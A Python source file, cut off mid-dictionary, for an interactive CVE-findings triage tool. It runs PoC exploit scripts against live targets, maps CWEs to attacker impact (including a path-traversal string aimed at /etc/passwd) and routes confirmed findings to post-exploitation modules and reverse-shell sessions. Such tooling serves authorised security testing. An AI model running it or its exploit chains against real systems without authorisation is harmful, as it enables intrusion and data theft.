#!/usr/bin/env python3
"""Interactive post-scan CVE findings triage.

Loads a JSON report produced by security_test, presents each CVE-related
finding interactively, shows impact analysis (what data and access the finding
exposes), and offers two re-verification modes against the live target.

Usage:
    python3 triage.py scan_results.json
    python3 triage.py scan_results.json --severity HIGH
    python3 triage.py scan_results.json --all           # all exploited, not just CVE
    python3 triage.py scan_results.json --re-verify     # auto-prompt re-verify per finding

Per-finding actions:
    [e]xpand        full detail, evidence, all references
    [i]mpact        CWE impact analysis — what an attacker can do and what data is at risk
    [ra] auto       re-run the detection script automatically; shows full evidence output
    [ri] interactive show the PoC script, optionally edit it in $EDITOR, run with live
                    output streamed to the terminal, then record a manual verdict
                    (confirmed / partial / not-confirmed) + free-text notes. Use this
                    to assess real criticality for RCE, SSRF, SQLi, and other findings
                    where you need to see actual data or craft a payload.
                    After confirmed/partial: opens the post-exploitation toolkit to
                    simulate the full attack chain — run follow-up modules, write
                    pivot PoCs, or open a raw TCP session for manual exploration.
    [a]ccept        mark as real, requires remediation
    [f]alse-pos     mark as false positive
    [w]aive         accept risk with justification
    [s]kip          next finding, no decision
    [q]uit          save decisions and exit

Triage decisions are saved alongside the report as <report>.triage.json.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
import select
import threading
import time
from typing import Dict, List, Optional, Tuple

try:
    import fcntl
    import termios
    import tty
    _HAS_PTY = True
except ImportError:
    _HAS_PTY = False

TOOL_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, TOOL_DIR)

# ─────────────────────────────────────────────── colour helpers ───────────────

_SEV_COLOR = {
    "CRITICAL": "\033[1;37;41m",
    "HIGH":     "\033[1;31m",
    "MEDIUM":   "\033[1;33m",
    "LOW":      "\033[1;34m",
    "INFO":     "\033[0;37m",
}
_RST  = "\033[0m"
_BOLD = "\033[1m"
_DIM  = "\033[2m"
_GRN  = "\033[1;32m"
_RED  = "\033[1;31m"
_YEL  = "\033[1;33m"
_CYN  = "\033[0;36m"

_USE_COLOR = sys.stdout.isatty()


def _cs(key: str, text: str) -> str:
    """Colour using a severity key."""
    if not _USE_COLOR:
        return text
    return f"{_SEV_COLOR.get(key, '')}{text}{_RST}"


def _cc(code: str, text: str) -> str:
    """Colour using an ANSI escape code."""
    if not _USE_COLOR:
        return text
    return f"{code}{text}{_RST}"


# ──────────────────────────────────────── CWE impact table ───────────────────
# Each entry: (short_name, attacker_capability, data_at_risk)
_CWE_IMPACT: Dict[str, Tuple[str, str, str]] = {
    "CWE-22":  (
        "Path Traversal",
        "Read arbitrary files via crafted path sequences (e.g. ../../../../etc/passwd).",
        "/etc/passwd, SSH private keys (~/.ssh/id_rsa), application .env files, "
        "database connection strings, TLS private certificates, cloud credential files."
    ),
    "CWE-23":  (
        "Relative Path Traversal",
        "Read arbitrary files via relative ../.. sequences — same impact as CWE-22.",
        "SSH private keys, application secrets, /etc/shadow if service runs as root."
    ),
    "CWE-36":  (
        "Absolute Path Traversal",
        "Read arbitrary files via absolute path bypass — same impact as CWE-22.",
        "Any file readable by the service user on the filesystem."
    ),
    "CWE-77":  (
        "Command Injection",
        "Inject shell metacharacters into OS commands executed by the application.",
        "All files readable by the process, environment secrets, ability to install "
        "backdoors and pivot to the internal network."
    ),
    "CWE-78":  (
        "OS Command Injection",
        "Execute arbitrary OS commands as the service user — full system compromise.",
        "All data on the system. Can exfiltrate databases, steal secrets, install "
        "persistence, and pivot to internal network via the compromised host."
    ),
    "CWE-79":  (
        "Cross-Site Scripting (XSS)",
        "Inject JavaScript executed in victims' browsers.",
        "Session tokens, form data, credentials typed into the application; allows "
        "impersonation and actions on behalf of any victim user."
    ),
    "CWE-89":  (
        "SQL Injection",
        "Inject arbitrary SQL into database queries.",
        "Entire database: all user records, hashed (and sometimes plaintext) credentials, "
        "PII, financial data. May enable OS command execution via xp_cmdshell or LOAD FILE."
    ),
    "CWE-94":  (
        "Code Injection",
        "Inject arbitrary code executed by the server-side runtime — equivalent to RCE.",
        "All application data, secrets visible to the process, ability to pivot."
    ),
    "CWE-200": (
        "Information Exposure",
        "Access data the service was not intended to reveal.",
        "Internal config values, API keys, session tokens, server paths, user data, "
        "debug output that guides further exploitation."
    ),
    "CWE-209": (
        "Error Message Information Leak",
        "Trigger errors that reveal internal implementation details in the response.",
        "File paths, framework and library versions, DB schema names, exception traces "
        "that eliminate guesswork for deeper attacks."
    ),
    "CWE-284": (
        "Improper Access Control",
        "Access resources or perform actions without proper authorisation.",
        "Any data or privileged function that should require higher permission."
    ),
    "CWE-285": (
        "Improper Authorisation",
        "Bypass authorisation for specific resources or operations.",
        "Other users' private data, admin functions, restricted API endpoints."
    ),
    "CWE-287": (
        "Authentication Bypass",
        "Access authenticated endpoints without supplying credentials.",
        "All data the application exposes to authenticated users — full unauthorised "
        "access with no credential requirement."
    ),
    "CWE-306": (
        "Missing Auth for Critical Function",
        "Invoke administrative or sensitive operations without any authentication.",
        "Admin panel, user management, configuration, or any privileged function "
        "exposed with no auth check."
    ),
    "CWE-400": (
        "Uncontrolled Resource Consumption",
        "Exhaust server resources (CPU, memory, file descriptors, connections).",
        "Availability only — crashes or severely degrades the service. "
        "No data exfiltration."
    ),
    "CWE-434": (
        "Unrestricted File Upload",
        "Upload a web shell or malicious executable to the server.",
        "Remote code execution as the web server user. Full filesystem access, "
        "pivot to internal network. Equivalent impact to full RCE."
    ),
    "CWE-502": (
        "Deserialization of Untrusted Data",
        "Exploit Java/PHP/.NET deserialization gadget chains to achieve RCE.",
        "All data accessible to the service account. Full system compromise. "
        "Common in Java (Apache Commons, Spring), PHP, and .NET Remoting."
    ),
    "CWE-532": (
        "Log File Information Exposure",
        "Read log files that inadvertently captured sensitive data.",
        "Credentials, session tokens, API keys, PII, payment data — anything that "
        "passed through logged code paths since last log rotation."
    ),
    "CWE-548": (
        "Directory Listing",
        "Enumerate all files in web-accessible directories.",
        "Backup files, config dumps, unlinked admin pages, source code archives, "
        "database exports accidentally placed in the web root."
    ),
    "CWE-601": (
        "Open Redirect",
        "Redirect victims to attacker-controlled sites.",
        "Credentials entered on phishing pages, OAuth tokens via redirect_uri bypass, "
        "session tokens leaked in Referer headers."
    ),
    "CWE-611": (
        "XML External Entity (XXE)",
        "Reference external entities in XML input to read local files or probe "
        "internal services via SSRF.",
        "Local files (/etc/passwd, TLS keys, app configs), internal service responses, "
        "cloud metadata endpoint (169.254.169.254) — can chain to credential theft."
    ),
    "CWE-664": (
        "Improper Control of a Resource Lifetime",
        "Cause resource mismanagement leading to use-after-free or memory corruption.",
        "Potential RCE via memory corruption; exact impact depends on the vulnerability."
    ),
    "CWE-770": (
        "Resource Allocation Without Limits",
        "Exhaust server memory, file descriptors, or threads.",
        "Availability only — crash or severe degradation. No data exfiltration."
    ),
    "CWE-834": (
        "Excessive Iteration",
        "Trigger CPU-exhausting loops causing denial of service.",
        "Availability impact — denial of service."
    ),
    "CWE-862": (
        "Missing Authorisation",
        "Access specific data or functionality without an authorisation check.",
        "Data or functionality corresponding to the missing check."
    ),
    "CWE-863": (
        "Incorrect Authorisation",
        "Access resources beyond granted privilege (horizontal/vertical escalation).",
        "Other users' private data, admin functions, or cross-tenant data."
    ),
    "CWE-918": (
        "Server-Side Request Forgery (SSRF)",
        "Make the server send requests to internal hosts or cloud metadata services.",
        "AWS/GCP/Azure IMDS credentials (IMDSv1), internal APIs behind the firewall, "
        "internal vaults, Redis/Elasticsearch without auth. Can chain to full RCE via "
        "stolen cloud credentials."
    ),
    "CWE-1321": (
        "Prototype Pollution",
        "Pollute JavaScript Object.prototype to inject arbitrary properties.",
        "Denial of service, property injection bypassing auth/validation checks, "
        "or RCE in Node.js server-side contexts."
    ),
    "CWE-250": (
        "Execution with Unnecessary Privileges",
        "Execute code as root via SUID binary, sudo NOPASSWD, or kernel LPE CVE.",
        "Full local root access: read /etc/shadow, dump memory, install persistent "
        "backdoors, pivot to sibling containers or trusted hosts via stolen credentials."
    ),
    "CWE-269": (
        "Improper Privilege Management",
        "Escalate via misconfigured roles, IAM policies, or group memberships.",
        "Cloud admin access, cross-account lateral movement, root on local host, "
        "Kubernetes cluster-admin. Enables exfiltration of all data the elevated role can reach."
    ),
    "CWE-522": (
        "Insufficiently Protected Credentials",
        "Recover plaintext or weakly-hashed credentials from storage or transit.",
        "Database passwords, API keys, cloud access credentials, private keys, "
        "session tokens. Direct access to any system the credential unlocks."
    ),
    "CWE-319": (
        "Cleartext Transmission of Sensitive Information",
        "Intercept credentials or session tokens from unencrypted connections.",
        "Passwords, API keys, session cookies, OAuth tokens, database credentials "
        "transmitted in cleartext. Full account takeover for any intercepted session."
    ),
    "CWE-326": (
        "Inadequate Encryption Strength",
        "Break weak cipher, factor short RSA key, or downgrade TLS to recover plaintext.",
        "Session cookies, private keys, encrypted database fields, VPN traffic. "
        "Enables MITM and decryption of recorded traffic."
    ),
    "CWE-798": (
        "Use of Hard-coded Credentials",
        "Authenticate to any instance of the service using the embedded credential.",
        "Full access to the service as the hard-coded user — typically admin or service "
        "account. Credential cannot be rotated without a code change."
    ),
    "CWE-668": (
        "Exposure of Resource to Wrong Sphere",
        "Access resources (files, ports, APIs) that should not be externally reachable.",
        "Internal APIs, admin panels, debug endpoints, inter-service credentials, "
        "cloud metadata services, localhost-only datastores exposed to the network."
    ),
    "CWE-732": (
        "Incorrect Permission Assignment for Critical Resource",
        "Read or write files/directories owned by a privileged user via lax permissions.",
        "Configuration files with plaintext credentials, SSH private keys, cron scripts "
        "writable for persistence, /etc/shadow, SSL certificates, deployment secrets."
    ),
    "CWE-444": (
        "Inconsistent Interpretation of HTTP Requests (Request Smuggling)",
        "Smuggle a hidden request past the front-end proxy to the back-end.",
        "Bypass access controls, poison HTTP caches, steal session cookies of other users, "
        "forge cross-user requests against internal-only admin endpoints."
    ),
    "CWE-345": (
        "Insufficient Verification of Data Authenticity",
        "Inject unsigned or forged data that the target trusts and processes.",
        "Arbitrary code execution via forged packages, unsigned container images, "
        "tampered SAML assertions, or JWT tokens with no signature verification."
    ),
    "CWE-494": (
        "Download of Code Without Integrity Check",
        "Substitute a malicious package or binary during installation or update.",
        "Full code execution in the build pipeline or on every host that installs the "
        "package. Persistent supply-chain backdoor affecting all downstream consumers."
    ),
    "CWE-295": (
        "Improper Certificate Validation",
        "MITM the TLS connection and intercept or modify plaintext traffic.",
        "Credentials, session tokens, API keys, PII, and any data in transit. "
        "Can pivot to arbitrary command injection if the intercepted traffic is trusted."
    ),
    "CWE-787": (
        "Out-of-bounds Write",
        "Corrupt adjacent memory to redirect execution flow (local or remote).",
        "Arbitrary code execution as the target process's user — typically root for "
        "kernel bugs. Enables credential dumping, container escape, and full system takeover."
    ),
    "CWE-347": (
        "Improper Verification of Cryptographic Signature",
        "Submit an unsigned or self-signed artifact that the system accepts as authentic.",
        "Deploy arbitrary container images, packages, or firmware. Full code execution "
        "on all hosts or devices that pull the accepted artifact."
    ),
    "CWE-506": (
        "Embedded Malicious Code",
        "Trigger pre-planted backdoor or trojan already embedded in a dependency.",
        "Code execution on every host or build agent that installs the affected package. "
        "Typical targets: secrets, SSH keys, cloud metadata, shell access."
    ),
    "CWE-1336": (
        "Improper Neutralization in Template Engine (SSTI)",
        "Inject template syntax to execute server-side code in the rendering engine.",
        "Remote code execution as the web server user (Jinja2, Twig, Freemarker). "
        "Full filesystem read, subprocess execution, reverse shell, lateral movement."
    ),
}

_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
_BAR = "━" * 74


# ──────────────────────────────────────── report loading ─────────────────────

def load_report(path: str) -> dict:
    with open(path, encoding="utf-8") as fh:
        return json.load(fh)


def _cve_id_from_finding(f: dict) -> str:
    """Extract the first CVE-XXXX-XXXXX reference from a finding dict."""
    for ref in f.get("references") or []:
        m = re.match(r"(CVE-\d{4}-\d+)", str(ref))
        if m:
            return m.group(1)
    # Also check the title
    m = re.search(r"(CVE-\d{4}-\d+)", f.get("title", ""))
    if m:
        return m.group(1)
    return ""


def _is_cve_finding(f: dict) -> bool:
    if _cve_id_from_finding(f):
        return True
    cat = f.get("category") or ""
    if cat.startswith("cve-"):
        return True
    for tag in f.get("tags") or []:
        if "cve" in tag.lower():
            return True
    return False


def extract_findings(modules: list, cve_only: bool, min_severity: str) -> List[Tuple[str, dict]]:
    """Return (module_name, finding) pairs filtered by kind and severity."""
    min_rank = _SEV_ORDER.get(min_severity.upper(), 4)
    out: List[Tuple[str, dict]] = []
    for mod in modules:
        for f in mod.get("findings") or []:
            sev = (f.get("severity") or "INFO").upper()
            if _SEV_ORDER.get(sev, 4) > min_rank:
                continue
            if cve_only and not _is_cve_finding(f):
                continue
            out.append((mod["name"], f))
    out.sort(key=lambda x: _SEV_ORDER.get((x[1].get("severity") or "INFO").upper(), 4))
    return out


# ──────────────────────────────────────── display ────────────────────────────

def _wrap(text: str, width: int = 72, indent: str = "  ") -> str:
    words = text.split()
    lines: List[str] = []
    line = indent
    for w in words:
        if len(line) + len(w) + 1 > width:
            lines.append(line.rstrip())
            line = indent + w + " "
        else:
            line += w + " "
    if line.strip():
        lines.append(line.rstrip())
    return "\n".join(lines)


def display_finding(module_name: str, f: dict, idx: int, total: int) -> None:
    cve_id   = _cve_id_from_finding(f)
    severity = (f.get("severity") or "INFO").upper()
    loc      = f.get("location") or "unknown"
    title    = f.get("title") or "(no title)"
    detail   = f.get("detail") or ""
    evidence = f.get("evidence") or ""
    cwe      = f.get("cwe") or ""
    refs     = list(f.get("references") or [])

    print()
    print(_cc(_BOLD, _BAR))

    # ── Header ───────────────────────────────────────────────────────────────
    counter   = _cc(_DIM, f"[{idx}/{total}]")
    sev_badge = _cs(severity, f" {severity} ")
    cve_part  = _cc(_BOLD, cve_id) if cve_id else _cc(_BOLD, title[:50])
    m_cvss    = re.search(r"CVSS[\s:]+([0-9.]+)", evidence)
    cvss_part = _cc(_DIM, f"  CVSS {m_cvss.group(1)}") if m_cvss else ""
    print(f"{counter} {sev_badge}  {cve_part}{cvss_part}")
    print(_cc(_DIM, f"  Module: {module_name}  │  Target: {loc}"))
    print()

    # ── Short description ─────────────────────────────────────────────────────
    first_line = detail.split("\n")[0] if detail else title
    print(_wrap(first_line, width=72, indent="  "))
    aliases = [r for r in refs
               if not r.startswith("CVE-") and not r.startswith("http")
               and not r.startswith("CWE-")]
    if aliases:
        print(_cc(_DIM, f"  ({', '.join(aliases)})"))
    print()

    # ── Impact analysis ───────────────────────────────────────────────────────
    if cwe and cwe in _CWE_IMPACT:
        cwe_name, can_do, at_risk = _CWE_IMPACT[cwe]
        print(_cc(_CYN, f"  ◈ Impact  {cwe}: {cwe_name}"))
        print(_wrap(can_do, indent="    "))
        print()
        print(_cc(_CYN, "  ◈ Data / access at risk"))
        print(_wrap(at_risk, indent="    "))
    else:
        cwe_label = f"{cwe}: " if cwe else ""
        print(_cc(_CYN, f"  ◈ Impact  {cwe_label}see CVE summary and CVSS vector for CIA scores"))

    print()

    # ── Key metrics ───────────────────────────────────────────────────────────
    m_epss = re.search(r"EPSS[\s:]+([0-9.]+)", evidence)
    if m_epss:
        epss_val = float(m_epss.group(1))
        bar_len  = int(epss_val * 20)
        bar      = "█" * bar_len + "░" * (20 - bar_len)
        print(_cc(_DIM, f"  EPSS {epss_val*100:.1f}%  [{bar}]  (probability exploited in the wild)"))

    ev_short = evidence[:180].replace("\n", " ")
    if ev_short:
        print(_cc(_DIM, f"  Evidence: {ev_short}"))
    print()


def show_expanded(f: dict) -> None:
    print()
    print(_cc(_BOLD, "── Full detail ──────────────────────────────────────────────────────────"))
    print(f.get("detail") or "(none)")
    ev = f.get("evidence")
    if ev:
        print()
        print(_cc(_BOLD, "── Evidence ─────────────────────────────────────────────────────────────"))
        print(ev)
    refs = f.get("references") or []
    if refs:
        print()
        print(_cc(_BOLD, "── References ───────────────────────────────────────────────────────────"))
        for r in refs:
            print(f"  {r}")
    tags = f.get("tags") or []
    if tags:
        print(_cc(_DIM, f"  tags: {', '.join(tags)}"))
    print()


# ──────────────────────────────────────── re-verification ────────────────────

def _parse_host_port(location: str) -> Tuple[str, int]:
    # IPv6 [::1]:port
    m = re.match(r"^\[([^\]]+)\]:(\d+)$", location)
    if m:
        return m.group(1), int(m.group(2))
    if ":" in location:
        parts = location.rsplit(":", 1)
        try:
            return parts[0], int(parts[1])
        except (ValueError, IndexError):
            pass
    return location, 80


def _build_cve_record(cve_id: str, finding: dict):
    """Reconstruct a CVERecord from the offline feed, falling back to finding fields."""
    try:
        from exploits.cve_enrich import load_feed
        from exploits.cve_resolver import CVERecord
    except ImportError as exc:
        print(f"  [!] Cannot import CVE modules: {exc}", file=sys.stderr)
        return None

    feed = load_feed()
    rec  = next((r for r in feed if r.get("cve") == cve_id), None)

    evidence = finding.get("evidence") or ""
    m_epss   = re.search(r"EPSS[\s:]+([0-9.]+)", evidence)
    epss     = float(m_epss.group(1)) if m_epss else 0.0

    if rec:
        return CVERecord(
            cve_id=cve_id,
            product=rec.get("product") or "unknown",
            severity=rec.get("severity") or "HIGH",
            cvss=float(rec.get("cvss") or 0.0),
            summary=rec.get("summary") or "",
            references=list(rec.get("references") or []),
            epss=epss,
            cwe=rec.get("cwe") or finding.get("cwe") or "",
            attack_vector="NETWORK",
            attack_complexity="LOW",
        )

    # Feed miss — reconstruct from the finding dict itself
    m_cvss   = re.search(r"CVSS[\s:]+([0-9.]+)", evidence)
    m_prod   = re.search(r"Product:\s*(\S+)", evidence + " " + (finding.get("detail") or ""))
    refs     = [r for r in (finding.get("references") or []) if r != cve_id]
    return CVERecord(
        cve_id=cve_id,
        product=m_prod.group(1) if m_prod else "unknown",
        severity=(finding.get("severity") or "HIGH"),
        cvss=float(m_cvss.group(1)) if m_cvss else {
            "CRITICAL": 9.0, "HIGH": 7.5, "MEDIUM": 5.5, "LOW": 3.5,
        }.get((finding.get("severity") or "HIGH").upper(), 5.0),
        summary=finding.get("title") or "",
        references=refs,
        epss=epss,
        cwe=finding.get("cwe") or "",
    )


def _open_editor(script: str) -> str:
    """Open script in $EDITOR (fallback: nano → vi) and return the edited content."""
    editor = (os.environ.get("VISUAL") or os.environ.get("EDITOR") or "")
    if not editor:
        for candidate in ("nano", "vi", "vim"):
            if subprocess.run(["which", candidate], capture_output=True).returncode == 0:
                editor = candidate
                break
    if not editor:
        print("  [!] No editor found ($EDITOR not set, nano/vi not on PATH).")
        return script

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", prefix="triage_poc_",
                                     delete=False) as tf:
        tf.write(script)
        tmp_path = tf.name

    try:
        subprocess.run([editor, tmp_path], check=False)
        with open(tmp_path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read()
    except Exception as exc:
        print(f"  [!] Editor error: {exc}")
        return script
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


def _run_script_operator(script: str, timeout: int = 60) -> Tuple[bool, str]:
    """Run an operator-reviewed script without sandbox resource caps.

    Streams stdout/stderr directly to the terminal so the operator sees live
    output (useful for interactive PoCs, reverse-shell proof steps, etc.).
    Returns (had_result_line: bool, evidence: str).
    """
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", prefix="triage_interactive_",
                                     delete=False) as tf:
        tf.write(script)
        tmp_path = tf.name

    restricted_env = {
        "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        "HOME": "/tmp",
        "PYTHONDONTWRITEBYTECODE": "1",
        "PYTHONNOUSERSITE": "1",
        "LANG": os.environ.get("LANG", "C.UTF-8"),
    }

    evidence = ""
    try:
        proc = subprocess.Popen(
            [sys.executable, "-S", tmp_path],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, env=restricted_env,
        )
        lines: list = []
        assert proc.stdout is not None

        def _drain() -> None:
            for line in proc.stdout:  # type: ignore[union-attr]
                print("    " + line, end="")
                lines.append(line.rstrip())

        reader = threading.Thread(target=_drain, daemon=True)
        reader.start()
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            print(f"\n  [!] Script timed out after {timeout}s")
        reader.join(timeout=5)

        for line in lines:
            if line.startswith("RESULT:"):
                parts = line.split(":", 2)
                if len(parts) >= 3:
                    evidence = parts[2]
                break

        return True, evidence
    except Exception as exc:
        print(f"\n  [!] Execution error: {exc}")
        return False, ""
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


def _get_plan(finding: dict, module_name: str):
    """Shared setup for both re-verify modes. Returns (cve_id, host, port, plan) or None."""
    loc = finding.get("location") or ""
    if not loc:
        print("  [!] No target location in finding — cannot re-verify.")
        return None

    cve_id = _cve_id_from_finding(finding)
    if not cve_id:
        print("  [!] No CVE ID found in finding references — cannot re-verify.")
        return None

    host, port = _parse_host_port(loc)

    record = _build_cve_record(cve_id, finding)
    if not record:
        return None

    try:
        from exploits import exploit_planner
    except ImportError as exc:
        print(f"  [!] Cannot import exploit modules: {exc}", file=sys.stderr)
        return None

    plans = exploit_planner.prioritize(
        [record], host, port, max_plans=1,
        has_llm=False, have_local_access=False,
    )
    if not plans:
        print("  No testable plan — CVE may require LOCAL/PHYSICAL access.")
        return None

    return cve_id, host, port, plans[0]


def re_verify_auto(module_name: str, finding: dict) -> None:
    """Automated re-verify: run detection with auto-confirm, show full evidence."""
    ctx = _get_plan(finding, module_name)
    if ctx is None:
        return
    cve_id, host, port, plan = ctx

    print(f"\n  [AUTO] Re-verifying {cve_id} against {host}:{port} …")
    print(f"  Strategy: {plan.test_strategy}  │  CVSS: {plan.cve.cvss:.1f}  │  "
          f"EPSS: {plan.cve.epss:.2f}")

    try:
        from exploits import exploit_generator
    except ImportError as exc:
        print(f"  [!] Cannot import exploit_generator: {exc}", file=sys.stderr)
        return

    result = exploit_generator.execute_plans(
        [plan], auto_confirm=True, interactive=False,
    )

    print()
    if result.exploited:
        print(_cc(_RED, "  ✔ CONFIRMED — detection succeeded:"))
    else:
        print(_cc(_GRN, "  ✗ NOT CONFIRMED — detection did not trigger:"))

    for rfinding in result.findings:
        sev = (rfinding.severity or "INFO").upper()
        print(f"    {_cs(sev, f'{sev:<8}')} {rfinding.title}")
        if rfinding.detail:
            for line in rfinding.detail.splitlines():
                print(_cc(_DIM, f"              {line}"))
        if rfinding.evidence:
            print(_cc(_CYN, f"    Evidence:   {rfinding.evidence[:300]}"))
    print()


def re_verify_interactive(module_name: str, finding: dict,
                          decisions: Dict[str, dict]) -> None:
    """Interactive re-verify: show PoC, let operator edit & run, record manual verdict.

    Works for every CWE family — RCE, DoS, reverse shell, SSRF, SQLi, etc. When
    the exploit planner has no plan or only a banner_match strategy, a CWE-appropriate
    PoC template is generated so the operator always reaches the editor and can run
    something real against the target.

    After confirmed RCE/shell: offers to launch a reverse shell listener and hand
    off a raw interactive PTY session to the operator.
    """
    loc = finding.get("location") or ""
    if not loc:
        print("  [!] No target location in finding — cannot re-verify.")
        return

    cve_id = _cve_id_from_finding(finding)
    cwe    = finding.get("cwe") or ""
    host, port = _parse_host_port(loc)

    # ── Try to get an exploit plan (best-effort — never required) ──────────────
    plan          = None
    plan_strategy = None
    plan_protocol = "http"
    plan_cvss     = 0.0
    plan_epss     = 0.0
    plan_summary  = finding.get("title") or ""

    if cve_id:
        record = _build_cve_record(cve_id, finding)
        if record:
            plan_cvss    = record.cvss
            plan_epss    = record.epss
            plan_summary = record.summary[:120]
            try:
                from exploits import exploit_planner
                plans = exploit_planner.prioritize(
                    [record], host, port, max_plans=1,
                    has_llm=False, have_local_access=False,
                )
                if plans:
                    plan          = plans[0]
                    plan_strategy = plan.test_strategy
                    plan_protocol = getattr(plan, "protocol", "http")
            except ImportError:
                pass

    cve_label = cve_id or "(no CVE ID)"
    print(f"\n  [INTERACTIVE] {cve_label} @ {host}:{port}  │  CWE: {cwe or 'unknown'}")
    if plan_cvss:
        print(f"  CVSS: {plan_cvss:.1f}  │  EPSS: {plan_epss:.2f}  │  "
              f"strategy: {plan_strategy or 'manual'}")
    if plan_summary:
        print(f"  {plan_summary}")
    print()

    # ── Get a PoC script ───────────────────────────────────────────────────────
    # Priority: (1) builtin template from exploit_generator,
    #           (2) CWE-appropriate template (always available),
    # banner_match / nuclei_template strategies have no editable script — skip to (2).
    script: Optional[str] = None
    if plan and plan_strategy not in ("banner_match", "nuclei_template"):
        try:
            from exploits import exploit_generator
            script = exploit_generator._select_builtin_template(plan)  # noqa: SLF001
        except ImportError:
            pass

    used_cwe_template = not script
    if not script:
        script = _cwe_poc_template(
            cve_id or "unknown", cwe, host, port,
            plan_summary, plan_protocol,
        )
        if plan_strategy in ("banner_match", "nuclei_template"):
            print(_cc(_DIM, f"  Strategy '{plan_strategy}' has no editable script — "
                            f"using {cwe or 'generic'} PoC template instead."))
        elif not plan:
            print(_cc(_DIM, f"  No exploit plan available — using {cwe or 'generic'} "
                            f"PoC template."))
        else:
            print(_cc(_DIM, f"  No built-in template — using {cwe or 'generic'} PoC template."))

    # ── Display the script ────────────────────────────────────────────────────
    print(_cc(_BOLD, "  ── PoC Script ──────────────────────────────────────────────────────"))
    for lineno, line in enumerate(script.splitlines(), 1):
        print(f"  {lineno:>3}  {line}")
    print(_cc(_BOLD, "  ────────────────────────────────────────────────────────────────────"))
    print()

    # ── Offer edit ────────────────────────────────────────────────────────────
    ans = _ask("  Edit script in $EDITOR before running? [y/N]: ").lower()
    if ans in ("y", "yes"):
        script = _open_editor(script)
        print()
        print(_cc(_YEL, "  [!] Running operator-modified script (no sandbox resource caps)."))

    # ── Run ───────────────────────────────────────────────────────────────────
    timeout = 30 if cwe in _DOS_CWES else 90
    print(_cc(_BOLD, "  ── Script output ───────────────────────────────────────────────────"))
    _, auto_evidence = _run_script_operator(script, timeout=timeout)
    print(_cc(_BOLD, "  ────────────────────────────────────────────────────────────────────"))
    print()

    # ── Verdict ───────────────────────────────────────────────────────────────
    print("  What did you observe?")
    print("    [c]onfirmed  — vulnerability is real, impact assessed")
    print("    [p]artial    — partially confirmed or ambiguous")
    print("    [n]ot-conf   — detection did not trigger / false positive")
    print("    [s]kip       — record nothing, return to menu")
    while True:
        verdict_raw = _ask("  verdict [c/p/n/s]: ").lower()
        if verdict_raw in ("c", "confirmed"):
            verdict = "confirmed"
            break
        if verdict_raw in ("p", "partial"):
            verdict = "partial"
            break
        if verdict_raw in ("n", "not-conf", "not-confirmed"):
            verdict = "not-confirmed"
            break
        if verdict_raw in ("s", "skip", ""):
            return
        print("  Choose c / p / n / s")

    notes = _ask("  Notes (what you saw, data accessed, severity rationale): ")

    fp = _fingerprint(module_name, finding)
    decisions[fp] = {
        "disposition":         "accepted" if verdict == "confirmed" else "undecided",
        "interactive_verdict": verdict,
        "module":              module_name,
        "cve":                 cve_id,
        "location":            finding.get("location") or "",
        "severity":            finding.get("severity") or "",
        "ts":                  time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "note":                notes,
        "auto_evidence":       auto_evidence,
    }

    verdict_colors = {"confirmed": _RED, "partial": _YEL, "not-confirmed": _GRN}
    print(_cc(verdict_colors[verdict], f"  ✔ Recorded: {verdict}" + (f" — {notes}" if notes else "")))
    print()

    if verdict not in ("confirmed", "partial"):
        return

    # ── Post-confirmation: route to CWE/tag-appropriate exploitation ──────────
    tags = finding.get("tags") or []
    url  = loc if loc.startswith(("http://", "https://")) else ""
    _exploitation_menu(cve_id or "unknown", host, port, cwe, tags, url)


# ─────────────────────────────── post-exploitation toolkit ───────────────────

# CWE → list of follow-up module names (ordered by relevance).
# These are the modules that make sense to run AFTER the initial access is
# confirmed, simulating what an attacker would pivot to next.
_CWE_FOLLOW_UP: Dict[str, List[str]] = {
    # RCE family — pivot to privesc, container/k8s escape, internal services
    "CWE-78":   ["linux-privesc", "container-escape-detector", "k8s-probe", "etcd-probe", "default-creds"],
    "CWE-77":   ["linux-privesc", "container-escape-detector", "k8s-probe"],
    "CWE-94":   ["linux-privesc", "container-escape-detector", "k8s-probe", "etcd-probe"],
    "CWE-502":  ["linux-privesc", "container-escape-detector", "unauth-service-probe"],
    "CWE-1336": ["linux-privesc", "container-escape-detector", "k8s-probe", "etcd-probe"],
    "CWE-787":  ["linux-privesc", "container-escape-detector"],
    # Auth bypass / unauth access — enumerate what is now reachable
    "CWE-287":  ["k8s-enum", "db-auth", "db-cred-access", "proto-auth", "access-prover"],
    "CWE-306":  ["k8s-enum", "db-auth", "unauth-service-probe", "access-prover"],
    # hard-coded / weak credentials and auth bypass both warrant cred-access + spray
    "CWE-798":  ["db-auth", "ssh-auth", "proto-auth", "db-cred-access", "default-creds"],
    "CWE-522":  ["db-auth", "ssh-auth", "proto-auth", "default-creds"],
    # Path traversal / file read — find secrets, then pivot
    "CWE-22":   ["linux-privesc", "unauth-service-probe", "port-probe"],
    "CWE-23":   ["linux-privesc", "unauth-service-probe", "port-probe"],
    "CWE-36":   ["linux-privesc", "unauth-service-probe"],
    # SQLi — escalate DB access
    "CWE-89":   ["db-cred-access", "db-auth"],
    # SSRF — probe internal network via the compromised service
    "CWE-918":  ["etcd-probe", "k8s-probe", "unauth-service-probe", "port-probe"],
    # Privilege mismanagement — check what the elevated role can reach
    "CWE-250":  ["linux-privesc", "container-escape-detector", "k8s-probe"],
    "CWE-269":  ["linux-privesc", "k8s-enum", "access-prover"],
    "CWE-732":  ["linux-privesc", "unauth-service-probe"],
    # Supply chain / injected code
    "CWE-494":  ["linux-privesc", "container-escape-detector"],
    "CWE-506":  ["linux-privesc", "container-escape-detector"],
    # Weak TLS — lateral MITM opportunities
    "CWE-295":  ["tls-grader", "port-probe"],
    "CWE-326":  ["tls-grader"],
    "CWE-319":  ["tls-grader", "port-probe"],
    # HTTP-layer issues — expand web surface
    "CWE-444":  ["unauth-service-probe", "k8s-probe"],
